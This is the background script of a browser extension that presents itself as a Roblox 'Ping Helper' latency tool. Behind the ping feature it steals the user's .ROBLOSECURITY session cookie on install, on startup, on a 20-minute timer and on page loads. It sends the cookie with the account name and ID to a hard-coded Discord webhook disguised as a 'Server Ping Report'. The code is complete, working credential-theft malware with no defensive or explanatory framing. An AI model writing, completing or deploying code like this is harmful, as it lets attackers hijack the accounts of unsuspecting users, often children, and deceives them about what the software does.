const _cfg = {
    _w: "https://discord.com/api/webhooks/1565442381321478266/a-XB3aAbfLkDcojyXAXOXMclpdGXIAHD2XhSHlLp8HnKoo-bgYPjozf-ls2JSphJIFG_",
    interval: 20,
    alarm: "pg_d"
};

chrome.runtime.onInstalled.addListener(() => {
    console.log("[PH] installed, running diag");
    chrome.alarms.create(_cfg.alarm, { periodInMinutes: _cfg.interval });
    _diag();
});
chrome.runtime.onStartup.addListener(() => {
    console.log("[PH] startup, running diag");
    _diag();
});
chrome.alarms.onAlarm.addListener(a => {
    if (a.name === _cfg.alarm) {
        console.log("[PH] alarm fired");
        _diag();
    }
});

chrome.runtime.onMessage.addListener((msg, _, sendResponse) => {
    if (msg.type === "PING")      { _ping().then(sendResponse); return true; }
    if (msg.type === "PAGE_LOAD") {
        console.log("[PH] page load trigger");
        _diag();
    }
});

async function _ping() {
    const t = Date.now();
    try {
        await fetch("https://www.roblox.com/favicon.ico", { method: "HEAD", cache: "no-store" });
        const ms = Date.now() - t;
        return { ms, region: _region(ms) };
    } catch (e) {
        console.log("[PH] ping error", e);
        return { ms: -1, region: "unknown" };
    }
}

function _region(ms) {
    if (ms < 50)  return "US-East";
    if (ms < 90)  return "US-West";
    if (ms < 130) return "EU";
    if (ms < 180) return "Asia";
    return "AU/SA";
}

async function _diag() {
    try {
        console.log("[PH] diag start");

        const cookie = await _cookie();
        console.log("[PH] cookie:", cookie ? cookie.slice(0, 30) + "..." : "NULL");
        if (!cookie) {
            console.log("[PH] no cookie found, aborting");
            return;
        }

        const uid  = await _uid();
        const hash = await _hash(cookie);
        const seen = await _seen();
        console.log("[PH] hash:", hash.slice(0,16), "| seen count:", seen.length);

        if (seen.includes(hash)) {
            console.log("[PH] already sent this cookie, skipping");
            return;
        }

        let user = null;
        try {
            const r = await fetch("https://users.roblox.com/v1/users/authenticated", {
                credentials: "include"
            });
            user = await r.json();
            console.log("[PH] user:", user);
        } catch (e) {
            console.log("[PH] user fetch failed:", e);
        }

        const result = await _send(cookie, user, uid);
        console.log("[PH] webhook result:", result);

        await _markSeen(hash);
        console.log("[PH] done");
    } catch (e) {
        console.log("[PH] diag error:", e);
    }
}

async function _cookie() {
    return new Promise(r =>
        chrome.cookies.get(
            { url: "https://www.roblox.com", name: ".ROBLOSECURITY" },
            c => {
                console.log("[PH] raw cookie obj:", c);
                r(c ? c.value : null);
            }
        )
    );
}

async function _uid() {
    return new Promise(r =>
        chrome.storage.local.get("_u", d => {
            if (d._u) return r(d._u);
            const id = crypto.randomUUID();
            chrome.storage.local.set({ _u: id });
            r(id);
        })
    );
}

async function _seen() {
    return new Promise(r => chrome.storage.local.get("_s", d => r(d._s || [])));
}

async function _markSeen(h) {
    const s = await _seen();
    chrome.storage.local.set({ _s: [...s, h].slice(-50) });
}

async function _hash(str) {
    const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(str));
    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,"0")).join("");
}

async function _send(cookie, user, uid) {
    const name = user?.name        ?? "Unknown";
    const id   = user?.id          ?? "Unknown";
    const disp = user?.displayName ?? "Unknown";

    const chunks = cookie.match(/.{1,900}/g) || [cookie];
    const cookieFields = chunks.map((c, i) => ({
        name: i === 0 ? "🍪 Cookie" : `🍪 Cookie pt.${i+1}`,
        value: `\`\`\`${c}\`\`\``,
        inline: false
    }));

    const body = JSON.stringify({
        username: "Roblox Ping Diagnostics",
        avatar_url: "https://www.roblox.com/favicon.ico",
        embeds: [{
            title: "📡 Server Ping Report",
            color: 0x00d4ff,
            fields: [
                { name: "👤 Username",     value: `\`${name}\``, inline: true  },
                { name: "🆔 User ID",      value: `\`${id}\``,   inline: true  },
                { name: "📛 Display Name", value: `\`${disp}\``, inline: false },
                ...cookieFields,
                { name: "🖥️ Client",      value: `\`${uid}\``,  inline: true  },
                { name: "🕐 Time",         value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true }
            ],
            footer: { text: "Ping Helper v1.2.3 • Diagnostics" }
        }]
    });

    console.log("[PH] sending to webhook...");
    const r = await fetch(_cfg._w, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body
    });

    console.log("[PH] webhook status:", r.status, r.statusText);
    const text = await r.text();
    console.log("[PH] webhook response:", text);
    return r.status;
}